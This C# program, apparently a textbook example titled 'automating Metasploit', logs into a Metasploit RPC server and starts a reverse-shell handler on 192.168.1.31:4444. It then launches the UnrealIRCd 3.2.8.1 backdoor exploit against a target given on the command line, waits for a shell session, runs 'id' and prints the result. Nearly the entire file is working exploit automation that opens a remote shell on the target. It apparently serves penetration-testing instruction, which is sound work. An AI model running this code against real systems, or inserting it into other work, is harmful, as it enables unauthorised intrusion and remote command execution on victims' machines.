using System;
using System.Collections.Generic;

namespace ch13_automating_metasploit
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			using (MetasploitSession session = new MetasploitSession ("user", "pass", "http://127.0.0.1:55553/api")) {
				if (string.IsNullOrEmpty (session.Token))
					throw new Exception ("Login failed. Check credentials");

				string listenAddr = "192.168.1.31";
				int listenPort = 4444;
				string payload = "cmd/unix/reverse";
				using (MetasploitManager manager = new MetasploitManager (session)) {
					Dictionary<string, object> response = null;

					Dictionary<string, object> blah = new Dictionary<string, object> ();
					blah ["ExitOnSession"] = false;
					blah ["PAYLOAD"] = payload;
					blah ["LHOST"] = listenAddr;
					blah ["LPORT"] = listenPort;

					response = manager.ExecuteModule ("exploit", "multi/handler", blah);
					object jobID = response ["job_id"];

					Dictionary<string, object> opts = new Dictionary<string, object> ();
					opts ["RHOST"] = args[0];
					opts ["DisablePayloadHandler"] = true;
					opts ["LHOST"] = listenAddr;
					opts ["LPORT"] = listenPort;
					opts ["PAYLOAD"] = payload;

					manager.ExecuteModule ("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);

					response = manager.ListJobs ();
					List<object> vals = new List<object> (response.Values);
					while (vals.Contains ((object)"Exploit: unix/irc/unreal_ircd_3281_backdoor")) {
						Console.WriteLine ("Waiting");
						System.Threading.Thread.Sleep (6000);
						response = manager.ListJobs ();
						vals = new List<object> (response.Values);
					}

					manager.StopJob (jobID.ToString ());

					response = manager.ListSessions ();
					foreach (var pair in response) {
						string id = pair.Key;
						Dictionary<string, object> dict = (Dictionary<string, object>)pair.Value;
						if ((dict ["type"] as string) == "shell") {
							manager.WriteToSessionShell (id, "id\n");
							System.Threading.Thread.Sleep (6000);
							response = manager.ReadSessionShell (id);

							Console.WriteLine (response ["data"]);

							manager.StopSession (id);
						}
					}
				}
			}
		}
	}
}
